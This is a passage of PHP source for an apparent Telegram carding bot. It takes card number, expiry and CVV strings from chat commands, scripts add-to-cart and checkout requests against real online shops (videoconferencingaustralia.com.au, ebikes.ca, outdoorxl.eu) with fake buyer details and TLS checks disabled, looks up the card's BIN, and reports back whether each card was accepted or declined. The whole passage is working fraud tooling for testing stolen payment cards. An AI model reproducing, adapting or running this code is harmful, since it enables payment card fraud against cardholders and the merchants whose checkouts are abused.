Content-Disposition: form-data; name="ak_bmk"


-----------------------------374786044736989103081803385670
Content-Disposition: form-data; name="ak_bck"


-----------------------------374786044736989103081803385670
Content-Disposition: form-data; name="ak_bmmc"

5
-----------------------------374786044736989103081803385670
Content-Disposition: form-data; name="ak_btmc"

0
-----------------------------374786044736989103081803385670
Content-Disposition: form-data; name="ak_bsc"

2
-----------------------------374786044736989103081803385670
Content-Disposition: form-data; name="ak_bte"


-----------------------------374786044736989103081803385670
Content-Disposition: form-data; name="ak_btec"

0
-----------------------------374786044736989103081803385670
Content-Disposition: form-data; name="ak_bmm"

342,67;235,521;106,111;1141,846;843,60;
-----------------------------374786044736989103081803385670--');

$Addtocart = curl_exec($ch);
curl_close($ch);


# Checkout

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.videoconferencingaustralia.com.au/checkout/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'GET /checkout/ HTTP/2',
    'Host: www.videoconferencingaustralia.com.au',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language: en-US,en;q=0.5',
    'Referer: https://www.videoconferencingaustralia.com.au/cart/',
    'Connection: keep-alive',
    'Upgrade-Insecure-Requests: 1',
    'Sec-Fetch-Dest: document',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-User: ?1',
    'TE: trailers',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR,  getcwd().'/cookie.txt');

$Checkout = curl_exec($ch);
$CheckoutNonce = trim(strip_tags(getStr($Checkout, '<input type="hidden" id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="','" />')));
curl_close($ch);


# WcAjaxCheckout

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.videoconferencingaustralia.com.au/?wc-ajax=checkout');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'POST /?wc-ajax=checkout HTTP/2',
    'Host: www.videoconferencingaustralia.com.au',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0',
    'Accept: application/json, text/javascript, */*; q=0.01',
    'Accept-Language: en-US,en;q=0.5',
    'Referer: https://www.videoconferencingaustralia.com.au/checkout/',
    'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With: XMLHttpRequest',
    'Origin: https://www.videoconferencingaustralia.com.au',
    'Connection: keep-alive',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
    'TE: trailers',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR,  getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Som&billing_last_name=Knows&billing_company=&billing_country=AU&billing_address_1=4813+Olive+St&billing_address_2=&billing_city=Commerce+City&billing_state=QLD&billing_postcode=6280&billing_phone=4193939123&billing_email=dadawsdwad%40gmail.com&account_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=AU&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=QLD&shipping_postcode=&order_comments=&shipping_method%5B0%5D=free_shipping%3A1&payment_method=cba&cba_card_type='.$cbin.'&cba_card_holder=som+knows&cba_card_number='.$cc.'&cba_card_expiration_month='.$mes.'&cba_card_expiration_year='.$ano2.'&cba_card_csc='.$cvv.'&terms=on&terms-field=1&_mc4wp_subscribe_woocommerce=0&_mc4wp_subscribe_woocommerce=1&woocommerce-process-checkout-nonce='.$CheckoutNonce.'&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');

$WcAjaxCheckout = curl_exec($ch);
$Response = trim(strip_tags(getStr($WcAjaxCheckout, '"messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\t<pre><strong><\/strong>\n','<\/pre>\t\t<\/li>\n\t<\/ul>\n"')));

$executionEndTime = microtime(true);
$seconds = $executionEndTime - $executionStartTime;
$TimeTaken = substr($seconds,0,4);

$TotalTime = curl_getinfo($ch)['total_time'];
$Time = substr($TotalTime, 0,4);
curl_close($ch);



# Responses >

if(strpos($WcAjaxCheckout, '"success"')) {
sendMessage($chatId, '<b>CVV Matched ($12.00)</b> ✅%0A%0A<b><u>CC:</u></b> <code>'.$lista.'</code>%0A<b><u>Gateway:</u></b> CBA%0A<b><u>Response:</u></b> '.$Response.'%0A%0A<b><u>BIN Info:</u></b> '.$Vendor.' - '.$CardType.' - '.$CardLevel.'%0A<b><u>Bank:</u></b> '.$Bank.'%0A<b><u>Country:</u></b> '.$Country.' '.$Emoji.'%0A%0A<b><u>Checked by:</u></b> <a href="tg://user?id=$userId">'.$firstname.'</a>%0A<b><u>Time Taken:</u></b> '.$TimeTaken.' seconds%0A<b><u>Checked on:</u></b> '.$Date.'');
}
else {
sendMessage($chatId, '<b>DECLINED</b> ❌%0A%0A<b><u>CC:</u></b> <code>'.$lista.'</code>%0A<b><u>Gateway:</u></b> CBA%0A<b><u>Response:</u></b> '.$Response.' %0A%0A<b><u>BIN Info:</u></b> '.$Vendor.' - '.$CardType.' - '.$CardLevel.'%0A<b><u>Bank:</u></b> '.$Bank.'%0A<b><u>Country:</u></b> '.$Country.' '.$Emoji.'%0A%0A<b><u>Checked by:</u></b> <a href="tg://user?id=$userId">'.$firstname.'</a>%0A<b><u>Time Taken:</u></b> '.$TimeTaken.' seconds%0A<b><u>Checked on:</u></b> '.$Date.'');
}

curl_close($ch);
unlink('cookie.txt');

}



#--------------------- [ Elavon Magento ]-------------------#

if ((strpos($message, "!elv") === 0)||(strpos($message, "/elv") === 0)){
$lista = substr($message, 5);
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];
$cvvlength = strlen($cvv);
$yearlength = strlen($ano);
$banner = substr($message, 5,6);

$cc1 = substr($cc, 0,4);
$cc2 = substr($cc, 4,4);
$cc3 = substr($cc, 8,4);
$cc4 = substr($cc, 12,4);
$cc6 = substr($cc, 0,6);


if(strlen($ano) == 4){
    $ano2 = substr($ano, 2);
    };
if(strlen($mes) == 2){
    $mes1 = substr($mes, 1);
    };



error_reporting(0);
set_time_limit(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

$cc1 = substr($cc, 0,4);
$cc2 = substr($cc, 4,4);
$cc3 = substr($cc, 8,4);
$cc4 = substr($cc, 12,4);
$cc6 = substr($cc, 0,6);

$cbin = substr($cc, 0,1);
if($cbin == "5"){
$cbin = "MC";
}else if($cbin == "4"){
$cbin = "VI";
}else if($cbin == "3"){
$cbin = "amex";
}


if(strlen($ano) == 4){
    $ano2 = substr($ano, 2);
    };
if(strlen($mes) == 2){
    $mes1 = substr($mes, 1);
    };

# Session ID
function SID(){
    $data = openssl_random_pseudo_bytes(16);
    $data[6] = chr(ord($data[6]) & 0x0f | 0x40);
    $data[8] = chr(ord($data[8]) & 0x3f | 0x80);
    return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
}


# Formkey
function GetRandomWord($len = 20) {
    $word = array_merge(range('a', 'z'), range('A', 'Z'));
    shuffle($word);
    return substr(implode($word), 0, $len);
}
$rcocks = GetRandomWord();
$Formkey = substr(str_shuffle(mt_rand().mt_rand().$rcocks), 0, 16);



# Randomizing Details

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];



# ----------------- [Bin Scrap ] ---------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://bin-check-dr4g.herokuapp.com/api/'.$cc6.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language: en-US,en;q=0.9',
    'Connection: keep-alive',
    'Host: bin-check-dr4g.herokuapp.com',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

$Lookup = curl_exec($ch);

$Vendor = getStr($Lookup, '"vendor":"','"');
$CardType = getStr($Lookup, '"type":"','"');
$CardLevel = getStr($Lookup, '"level":"','"');
$Bank = getStr($Lookup, '"bank":"','"');
$Country = getStr($Lookup, '"country":"','"');
$Emoji = getStr($Lookup, '"emoji":"','"');


curl_close($ch);
# ----------------- [ Bin Scrap End ] ---------------------#



if ((preg_match('/\s/', $lista)) || (!$cc) || (!$mes) || (strlen($cvv) < 3) || (!$cvv) || (!$ano) )  {
sendMessage($chatId, '<b>Invalid Card Format!</b> ❌%0A%0A<b>Format:</b> xxxxxxxxxxxxxxxx|xx|xxxx|xxx%0A%0A<b>Please try again.</b>');
return;
};



$executionStartTime = microtime(true);





# Add to cart

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://ebikes.ca/checkout/cart/add/uenc/aHR0cHM6Ly9lYmlrZXMuY2Evc2hvcC9lbGVjdHJpYy1iaWN5Y2xlLXBhcnRzL2Jhc2VydW5uZXItcGxhdGUtbW91bnQuaHRtbA%2C%2C/product/1316/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'POST /checkout/cart/add/uenc/aHR0cHM6Ly9lYmlrZXMuY2Evc2hvcC9lbGVjdHJpYy1iaWN5Y2xlLXBhcnRzL2Jhc2VydW5uZXItcGxhdGUtbW91bnQuaHRtbA%2C%2C/product/1316/ HTTP/1.1',
    'Host: ebikes.ca',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
    'Accept: application/json, text/javascript, */*; q=0.01',
    'Accept-Language: en-US,en;q=0.5',
    'X-Requested-With: XMLHttpRequest',
    'Content-Type: multipart/form-data; boundary=---------------------------249008253562878117828491090',
    'Origin: https://ebikes.ca',
    'Connection: keep-alive',
    'Referer: https://ebikes.ca/shop/electric-bicycle-parts/baserunner-plate-mount.html',
    'Cookie: form_key='.$Formkey.'',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR,  getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '-----------------------------249008253562878117828491090
Content-Disposition: form-data; name="product"

1316
-----------------------------249008253562878117828491090
Content-Disposition: form-data; name="selected_configurable_option"


-----------------------------249008253562878117828491090
Content-Disposition: form-data; name="related_product"


-----------------------------249008253562878117828491090
Content-Disposition: form-data; name="item"

1316
-----------------------------249008253562878117828491090
Content-Disposition: form-data; name="form_key"

'.$Formkey.'
-----------------------------249008253562878117828491090
Content-Disposition: form-data; name="qty"

1
-----------------------------249008253562878117828491090--');

$Addtocart = curl_exec($ch);
curl_close($ch);


# Checkout

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://ebikes.ca/checkout/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'GET /checkout/ HTTP/1.1',
    'Host: ebikes.ca',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language: en-US,en;q=0.5',
    'Connection: keep-alive',
    'Referer: https://ebikes.ca/shop/electric-bicycle-parts/baserunner-plate-mount.html',
    'Upgrade-Insecure-Requests: 1',
    'Sec-Fetch-Dest: document',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-User: ?1',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR,  getcwd().'/cookie.txt');

$Checkout = curl_exec($ch);
$CartID = trim(strip_tags(getStr($Checkout, '"entity_id":"','"')));
curl_close($ch);


# Shipping Information

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://ebikes.ca/rest/international/V1/guest-carts/'.$CartID.'/shipping-information');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'POST /rest/international/V1/guest-carts/'.$CartID.'/shipping-information HTTP/1.1',
    'Host: ebikes.ca',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
    'Accept: */*',
    'Accept-Language: en-US,en;q=0.5',
    'Content-Type: application/json',
    'X-Requested-With: XMLHttpRequest',
    'Origin: https://ebikes.ca',
    'Connection: keep-alive',
    'Referer: https://ebikes.ca/checkout/',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR,  getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"addressInformation":{"shipping_address":{"countryId":"CA","regionId":"73","regionCode":"NU","region":"Nunavut","street":["4813 Olive St"],"company":"","telephone":"4193939123","postcode":"A1A1A1","city":"Commerce City","firstname":"Som","lastname":"Knows"},"billing_address":{"countryId":"CA","regionId":"73","regionCode":"NU","region":"Nunavut","street":["4813 Olive St"],"company":"","telephone":"4193939123","postcode":"A1A1A1","city":"Commerce City","firstname":"Som","lastname":"Knows","saveInAddressBook":null},"shipping_method_code":"flatrate","shipping_carrier_code":"flatrate","extension_attributes":{}}}');

$ShippingInformation = curl_exec($ch);
curl_close($ch);


# Payment Information

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://ebikes.ca/rest/international/V1/guest-carts/'.$CartID.'/payment-information');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'POST /rest/international/V1/guest-carts/'.$CartID.'/payment-information HTTP/1.1',
'Host: ebikes.ca',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
'Accept: */*',
'Accept-Language: en-US,en;q=0.5',
'Content-Type: application/json',
'X-Requested-With: XMLHttpRequest',
'Origin: https://ebikes.ca',
'Connection: keep-alive',
'Referer: https://ebikes.ca/checkout/',
'Sec-Fetch-Dest: empty',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Site: same-origin',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR,  getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"cartId":"'.$CartID.'","billingAddress":{"countryId":"CA","regionId":"73","regionCode":"NU","region":"Nunavut","street":["4813 Olive St"],"company":"","telephone":"'.$phone.'","postcode":"A1A1A1","city":"Commerce City","firstname":"Som","lastname":"Knows","saveInAddressBook":null},"paymentMethod":{"method":"rootways_elavon_option","additional_data":{"cc_cid":"'.$cvv.'","cc_ss_start_month":"","cc_ss_start_year":"","cc_ss_issue":"","cc_type":"'.$cbin.'","cc_exp_year":"'.$ano.'","cc_exp_month":"'.$mes.'","cc_number":"'.$cc.'"}},"comments":"","email":"Som'.$name.''.rand(1111,9999).'381231928'.rand(11111,99999).'@gmail.com"}');

$PaymentInformation = curl_exec($ch);
$Response = trim(strip_tags(getStr($PaymentInformation, '"message":"','"')));
$Http = curl_getinfo($ch)['http_code'];


$executionEndTime = microtime(true);
$seconds = $executionEndTime - $executionStartTime;
$TimeTaken = substr($seconds,0,4);

$TotalTime = curl_getinfo($ch)['total_time'];
$Time = substr($TotalTime, 0,4);

curl_close($ch);




# Responses >

if($Http == '200' && strpos($PaymentInformation, '"message"') === false ) {
sendMessage($chatId, '<b>CVV Matched</b> ✅%0A%0A<b><u>CC:</u></b> <code>'.$lista.'</code>%0A<b><u>Gateway:</u></b> Elavon Converge%0A<b><u>Order ID:</u></b> '.$PaymentInformation.'%0A<b><u>HTTP Code:</u></b> '.$Http.'%0A%0A<b><u>BIN Info:</u></b> '.$Vendor.' - '.$CardType.' - '.$CardLevel.'%0A<b><u>Bank:</u></b> '.$Bank.'%0A<b><u>Country:</u></b> '.$Country.' '.$Emoji.'%0A%0A<b><u>Checked by:</u></b> <a href="tg://user?id=$userId">'.$firstname.'</a>%0A<b><u>Time Taken:</u></b> '.$TimeTaken.' seconds%0A<b><u>Checked on:</u></b> '.$Date.'');
}
elseif (strpos($PaymentInformation, 'DECLINED: NSF')) {
sendMessage($chatId, '<b>CVV Matched</b> ✅%0A%0A<b><u>CC:</u></b> <code>'.$lista.'</code>%0A<b><u>Gateway:</u></b> Elavon Converge%0A<b><u>Response:</u></b> Not Sufficient Funds%0A<b><u>HTTP Code:</u></b> '.$Http.'%0A%0A<b><u>BIN Info:</u></b> '.$Vendor.' - '.$CardType.' - '.$CardLevel.'%0A<b><u>Bank:</u></b> '.$Bank.'%0A<b><u>Country:</u></b> '.$Country.' '.$Emoji.'%0A%0A<b><u>Checked by:</u></b> <a href="tg://user?id=$userId">'.$firstname.'</a>%0A<b><u>Time Taken:</u></b> '.$TimeTaken.' seconds%0A<b><u>Checked on:</u></b> '.$Date.'');
}
elseif(($Http == 502) || ($Http == 403) || ($Http == 404) || ($Http == 502) || ($Http == 500)) {
sendMessage($chatId, '<b>ERROR</b> ❌%0A%0A<b><u>CC:</u></b> <code>'.$lista.'</code>%0A<b><u>Gateway:</u></b> Elavon Converge%0A<b><u>Response:</u></b> Server side internal error. Please try again later.%0A%0A<b><u>BIN Info:</u></b> '.$Vendor.' - '.$CardType.' - '.$CardLevel.'%0A<b><u>Bank:</u></b> '.$Bank.'%0A<b><u>Country:</u></b> '.$Country.' '.$Emoji.'%0A%0A<b><u>Checked by:</u></b> <a href="tg://user?id=$userId">'.$firstname.'</a>%0A<b><u>Time Taken:</u></b> '.$TimeTaken.' seconds%0A<b><u>Checked on:</u></b> '.$Date.'');
}
else {
sendMessage($chatId, '<b>DECLINED</b> ❌%0A%0A<b><u>CC:</u></b> <code>'.$lista.'</code>%0A<b><u>Gateway:</u></b> Elavon Converge%0A<b><u>Response:</u></b> '.$Response.'%0A<b><u>HTTP Code:</u></b> '.$Http.'%0A%0A<b><u>BIN Info:</u></b> '.$Vendor.' - '.$CardType.' - '.$CardLevel.'%0A<b><u>Bank:</u></b> '.$Bank.'%0A<b><u>Country:</u></b> '.$Country.' '.$Emoji.'%0A%0A<b><u>Checked by:</u></b> <a href="tg://user?id=$userId">'.$firstname.'</a>%0A<b><u>Time Taken:</u></b> '.$TimeTaken.' seconds%0A<b><u>Checked on:</u></b> '.$Date.'');
}

curl_close($ch);
unlink('cookie.txt');

}




#--------------------- [ Elavon Magento ]-------------------#

if ((strpos($message, "!bcm") === 0)||(strpos($message, "/bcm") === 0)){
$lista = substr($message, 5);
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];
$cvvlength = strlen($cvv);
$yearlength = strlen($ano);
$banner = substr($message, 5,6);

$cc1 = substr($cc, 0,4);
$cc2 = substr($cc, 4,4);
$cc3 = substr($cc, 8,4);
$cc4 = substr($cc, 12,4);
$cc6 = substr($cc, 0,6);


if(strlen($ano) == 4){
    $ano2 = substr($ano, 2);
    };
if(strlen($mes) == 2){
    $mes1 = substr($mes, 1);
    };



error_reporting(0);
set_time_limit(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);  
return $str[0];
};
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

$cc1 = substr($cc, 0,4);
$cc2 = substr($cc, 4,4);
$cc3 = substr($cc, 8,4);
$cc4 = substr($cc, 12,4);
$cc6 = substr($cc, 0,6);

$cbin = substr($cc, 0,1);
if($cbin == "5"){
$cbin = "MC";
}else if($cbin == "4"){
$cbin = "VI";
}else if($cbin == "3"){
$cbin = "amex";
}


if(strlen($ano) == 4){
    $ano2 = substr($ano, 2);
    };
if(strlen($mes) == 2){
    $mes1 = substr($mes, 1);
    };

# Session ID
function SID(){
    $data = openssl_random_pseudo_bytes(16);
    $data[6] = chr(ord($data[6]) & 0x0f | 0x40);
    $data[8] = chr(ord($data[8]) & 0x3f | 0x80);
    return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
}


# Formkey
function GetRandomWord($len = 20) {
    $word = array_merge(range('a', 'z'), range('A', 'Z'));
    shuffle($word);
    return substr(implode($word), 0, $len);
}
$rcocks = GetRandomWord();
$Formkey = substr(str_shuffle(mt_rand().mt_rand().$rcocks), 0, 16);



# Randomizing Details

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];



# ----------------- [Bin Scrap ] ---------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://bin-check-dr4g.herokuapp.com/api/'.$cc6.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language: en-US,en;q=0.9',
    'Connection: keep-alive',
    'Host: bin-check-dr4g.herokuapp.com',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

$Lookup = curl_exec($ch);

$Vendor = getStr($Lookup, '"vendor":"','"');
$CardType = getStr($Lookup, '"type":"','"');
$CardLevel = getStr($Lookup, '"level":"','"');
$Bank = getStr($Lookup, '"bank":"','"');
$Country = getStr($Lookup, '"country":"','"');
$Emoji = getStr($Lookup, '"emoji":"','"');


curl_close($ch);
# ----------------- [ Bin Scrap End ] ---------------------#



if ((preg_match('/\s/', $lista)) || (!$cc) || (!$mes) || (strlen($cvv) < 3) || (!$cvv) || (!$ano) )  {
sendMessage($chatId, '<b>Invalid Card Format!</b> ❌%0A%0A<b>Format:</b> xxxxxxxxxxxxxxxx|xx|xxxx|xxx%0A%0A<b>Please try again.</b>');
return;
};



$executionStartTime = microtime(true);





# Add to cart

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.outdoorxl.eu/mdlajaxcheckout/index/cart/cart/add/uenc/aHR0cHM6Ly93d3cub3V0ZG9vcnhsLmV1L2FkdmVudHVyZS1mb29kLWVuZXJneS1iYXItc2VlZHMuaHRtbA,,/product/63092/form_key/'.$Formkey.'/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: www.outdoorxl.eu',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0',
    'Accept: text/javascript, text/html, application/xml, text/xml, */*',
    'Accept-Language: en-US,en;q=0.5',
    'X-Requested-With: XMLHttpRequest',
    'X-Prototype-Version: 1.7',
    'Content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'Origin: https://www.outdoorxl.eu',
    'Alt-Used: www.outdoorxl.eu',
    'Connection: keep-alive',
    'Referer: https://www.outdoorxl.eu/adventure-food-energy-bar-seeds.html',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
    'TE: trailers',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'product=63092&related_product=&qty=1');


$Addtocart = curl_exec($ch);
curl_close($ch);



# Checkout

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.outdoorxl.eu/onestepcheckout/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'GET /onestepcheckout/ HTTP/3',
    'Host: www.outdoorxl.eu',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0',
    'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language: en-US,en;q=0.5',
    'Alt-Used: www.outdoorxl.eu',
    'Connection: keep-alive',
    'Referer: https://www.outdoorxl.eu/checkout/cart/',
    'Upgrade-Insecure-Requests: 1',
